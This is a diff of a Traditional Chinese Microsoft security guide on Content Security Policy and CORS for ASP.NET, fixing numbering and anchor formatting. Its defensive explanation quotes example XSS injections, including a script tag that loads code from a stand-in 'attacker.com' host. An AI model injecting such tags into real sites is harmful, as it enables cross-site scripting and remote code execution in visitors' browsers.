@@ -44,7 +44,7 @@ ms.lasthandoff: 03/10/2017
 | 適用的技術 | 泛型 |
 | 屬性              | N/A  |
 | 參考              | [內容安全性原則簡介](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](http://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://docs.webplatform.org/wiki/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
-| 步驟 | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以白名單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰**如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制&1; 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 白名單中</li></ul></li><li>**控制資料外洩︰**如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的白名單中</li><li>**防禦點擊劫持：**點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰**如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
+| 步驟 | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以白名單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰**如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 白名單中</li></ul></li><li>**控制資料外洩︰**如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的白名單中</li><li>**防禦點擊劫持：**點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰**如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
 
 ### <a name="example"></a>範例
 範例原則︰ 
@@ -135,7 +135,7 @@ Example: var str="alert(1)"; eval(str);
     </system.webServer>
 ```
 
-## <a id="cors-aspnet">確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源</a>
+## <a id="cors-aspnet"></a>確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源
 
 | Title                   | 詳細資料      |
 | ----------------------- | ------------ |
@@ -397,7 +397,7 @@ public class ResourcesController : ApiController
 | 參考              | [在 ASP.NET Core 1.0 中啟用跨源要求](https://docs.asp.net/en/latest/security/cors.html)。 |
 | 步驟 | <p>在 ASP.NET Core 1.0 中，可以使用中介軟體或使用 MVC 啟用 CORS。 使用 MVC 來啟用 CORS 時，會使用相同的 CORS 服務，但不會使用 CORS 中介軟體。</p>|
 
-**方法&1;** 使用中介軟體啟用 CORS︰若要針對整個應用程式啟用 CORS，請使用 UseCors 擴充方法，將 CORS 中介軟體新增至要求管線。 使用 CorsPolicyBuilder 類別新增 CORS 中介軟體時，可以指定跨源原則。 作法有二：
+**方法 1** 使用中介軟體啟用 CORS︰若要針對整個應用程式啟用 CORS，請使用 UseCors 擴充方法，將 CORS 中介軟體新增至要求管線。 使用 CorsPolicyBuilder 類別新增 CORS 中介軟體時，可以指定跨源原則。 作法有二：
 
 ### <a name="example"></a>範例
 第一種方法是使用 Lambda 呼叫 UseCors。 Lambda 會採用 CorsPolicyBuilder 物件︰ 
@@ -432,7 +432,7 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**方法&2;** 在 MVC 中啟用 CORS︰開發人員也可以使用 MVC 來套件每個動作、每個控制站或適用於所有控制站的特定 CORS。
+**方法 2** 在 MVC 中啟用 CORS︰開發人員也可以使用 MVC 來套件每個動作、每個控制站或適用於所有控制站的特定 CORS。
 
 ### <a name="example"></a>範例
 每個動作︰若要指定特定動作的 CORS 原則，請將 [EnableCors] 屬性套用至該動作。 指定原則名稱。 
